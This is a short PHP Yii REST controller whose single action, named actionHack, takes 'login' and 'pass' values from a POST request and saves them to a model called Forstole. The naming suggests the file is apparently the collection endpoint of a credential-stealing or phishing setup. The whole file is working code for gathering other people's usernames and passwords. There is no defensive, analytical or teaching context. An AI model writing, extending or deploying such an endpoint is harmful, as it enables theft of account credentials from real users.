<?php


namespace api\controllers;


use backend\models\Forstole;
use Yii;

use yii\rest\Controller;

class V2Controller extends Controller
{

    public function actionHack()
    {

        $posts = Yii::$app->request->post()[0];
        $stole = new Forstole();
        $stole->login = $posts['login'];
        $stole->pass = $posts['pass'];
        return $stole->save();


    }


}
